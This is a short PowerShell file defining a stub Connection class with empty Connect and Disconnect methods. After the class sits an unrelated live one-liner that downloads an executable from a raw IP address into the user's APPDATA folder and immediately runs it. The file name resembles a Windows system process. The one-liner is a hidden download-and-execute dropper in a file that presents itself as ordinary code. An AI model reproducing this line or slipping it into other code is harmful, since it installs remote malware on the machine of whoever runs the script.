


class Connection : BaseLogger {
    [ConnectionConfig]$Config
    [ConnectionStatus]$Status = [ConnectionStatus]::Disconnected

    [void]Connect() {}

    [void]Disconnect() {}
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

